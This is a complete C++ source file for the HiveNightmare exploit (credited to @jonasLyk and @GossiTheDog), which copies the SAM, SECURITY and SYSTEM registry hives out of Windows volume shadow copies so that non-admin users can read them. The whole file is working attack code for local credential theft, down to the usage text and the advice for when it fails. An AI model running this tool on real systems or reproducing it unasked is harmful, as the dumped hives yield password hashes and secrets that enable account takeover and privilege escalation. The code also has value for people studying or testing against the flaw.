// Exploit for HiveNightmare, discovered by @jonasLyk, PoC by @GossiTheDog, powered by Porgs
// Allows you to read SAM, SYSTEM and SECURITY registry hives in Windows 10 from non-admin users

// History
// 0.1 - 20/07/2021 - Initial version
// 0.2 - 20/07/2021 - Adds support for 4 snapshots
// 0.3 - 20/07/2021 - merge in support for SYSTEM and SECURITY dumping, various bug fixes
// 0.4 - 21/07/2021 - better code shocker :O
// 0.5 - 21/07/2021 - favour retrieving hives from latest snapshot, UTF-16 support, bump to 15 snapshots
// 0.6 - 26/07/2021 - close file handle to avoid being a dummy

#include <windows.h>
#include <io.h>
#include <fcntl.h>
#include <iostream>

using std::endl;
using std::wcout;

HANDLE getVssFileHandle(TCHAR* path, int maxSearch) {
    HANDLE hfile;
    HANDLE retHandle = INVALID_HANDLE_VALUE;
    FILETIME creationTime;
    FILETIME lastAccessTime;
    FILETIME lastWriteTime;
    FILETIME youngest = { 0, 0 };

    wchar_t base[] = L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy";

    for (int i = 1; i <= maxSearch; i++) {
        wchar_t fullPath[MAX_PATH];
        swprintf_s(fullPath, MAX_PATH, L"%s%d\\%s", base, i, path);

        hfile = CreateFile(fullPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hfile != INVALID_HANDLE_VALUE) {
            if (GetFileTime(hfile, &creationTime, &lastAccessTime, &lastWriteTime)) {
                if (CompareFileTime(&youngest, &lastWriteTime) < 0) {
                    retHandle = hfile;
                    youngest = lastWriteTime;
                    wcout << "Newer file found: " << fullPath << endl;
                }
                else {
                    CloseHandle(hfile);
                }
            }
        }
    }
    return retHandle;
}

void dumpHandleToFile(HANDLE handle, wchar_t* dest) {
    HANDLE hAppend;
    DWORD  dwBytesRead, dwBytesWritten, dwPos;
    BYTE   buff[4096];
    hAppend = CreateFile(dest, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hAppend == INVALID_HANDLE_VALUE)
    {
        printf("Could not write %ls - permission issue rather than vulnerability issue, make sure you're running from a folder where you can write to\n", dest);
        return;
    }

    while (ReadFile(handle, buff, sizeof(buff), &dwBytesRead, NULL)
        && dwBytesRead > 0)
    {
        dwPos = SetFilePointer(hAppend, 0, NULL, FILE_END);
        LockFile(hAppend, dwPos, 0, dwBytesRead, 0);
        WriteFile(hAppend, buff, dwBytesRead, &dwBytesWritten, NULL);
        UnlockFile(hAppend, dwPos, 0, dwBytesRead, 0);
    }

    CloseHandle(hAppend);
}

bool getFileTime(HANDLE handle, LPTSTR buf, int buflen) {
    FILETIME creationTime;
    FILETIME lastAccessTime;
    FILETIME lastWriteTime;
    SYSTEMTIME st;

    if (!GetFileTime(handle, &creationTime, &lastAccessTime, &lastWriteTime)) {
        if (buflen > 0)
            buf[0] = L'\0';
        return false;
    }
    FileTimeToSystemTime(&lastWriteTime, &st);
    GetDateFormat(LOCALE_USER_DEFAULT, 0, &st, L"yyyy-MM-dd", buf, buflen);
    
    return true;
}



int main(int argc, char* argv[])
{
    int searchDepth;
    _setmode(_fileno(stdout), _O_U16TEXT);
    if (argc > 1) {
        if (sscanf_s(argv[1], "%d", &searchDepth) != 1) {
            wcout << "\nUsage: HiveNightmare.exe [max shadows to look at (default 15)]\n\n";
            return -1;
        }
    }
    else {
        searchDepth = 15;
    }

    wcout << L"\nHiveNightmare v0.6 - dump registry hives as non-admin users\n\nSpecify maximum number of shadows to inspect with parameter if wanted, default is 15.\n\nRunning...\n\n";

    HANDLE hFile;

    TCHAR samLocation[] = L"Windows\\System32\\config\\SAM";
    TCHAR securityLocation[] = L"Windows\\System32\\config\\SECURITY";
    TCHAR systemLocation[] = L"Windows\\System32\\config\\SYSTEM";
    TCHAR fileTime[200];
    TCHAR fileName[20];

    hFile = getVssFileHandle(samLocation, searchDepth);
    if (hFile == INVALID_HANDLE_VALUE) {
        wcout << "Could not open SAM :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n";
        return -1;
    }
    else {
        getFileTime(hFile, fileTime, 200);
        swprintf_s(fileName, L"SAM-%s", fileTime); //buggy if name too long
        dumpHandleToFile(hFile, fileName);
        CloseHandle(hFile);
        wcout << endl << L"Success: SAM hive from " << fileTime << L" written out to current working directory as " << fileName << endl << endl;
    }
    

    hFile = getVssFileHandle(securityLocation, searchDepth);
    if (hFile == INVALID_HANDLE_VALUE) {
        wcout << "Could not open SECURITY :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n";
        return -1;
    }
    else {
        getFileTime(hFile, fileTime, 200);
        swprintf_s(fileName, L"SECURITY-%s", fileTime);
        dumpHandleToFile(hFile, fileName);
        CloseHandle(hFile);
        wcout << endl << L"Success: SECURITY hive from " << fileTime << L" written out to current working directory as " << fileName << endl << endl;
    }
    

    hFile = getVssFileHandle(systemLocation, searchDepth);
    if (hFile == INVALID_HANDLE_VALUE) {
        wcout << "Could not open SYSTEM :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n";
        return -1;
    }
    else {
        getFileTime(hFile, fileTime, 200);
        swprintf_s(fileName, L"SYSTEM-%s", fileTime);
        dumpHandleToFile(hFile, fileName);
        CloseHandle(hFile);
        wcout << endl << L"Success: SYSTEM hive from " << fileTime << L" written out to current working directory as " << fileName << endl << endl;
    }

    wcout << endl << L"Assuming no errors above, you should be able to find hive dump files in current working directory." << endl;

    return 0;
}
